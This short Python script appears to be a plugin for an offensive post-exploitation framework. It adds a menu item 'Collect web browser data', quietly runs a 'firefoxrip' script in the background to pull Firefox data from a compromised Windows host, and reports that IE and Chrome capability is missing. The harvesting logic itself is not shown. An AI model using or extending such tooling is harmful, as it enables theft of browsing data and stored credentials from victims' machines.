
import dsz
MENU_TEXT = 'Collect web browser data'

def main():
    dsz.ui.Echo('Pulling Firefox browser data...', dsz.GOOD)
    dsz.control.echo.Off()
    dsz.cmd.Run('background log python windows/firefoxrip.py -args "-s 1000000"', dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    dsz.ui.Echo('\tNo IE Capability Available!', dsz.WARNING)
    dsz.ui.Echo('\tNo Chrome Capability Available!', dsz.WARNING)
if (__name__ == '__main__'):
    main()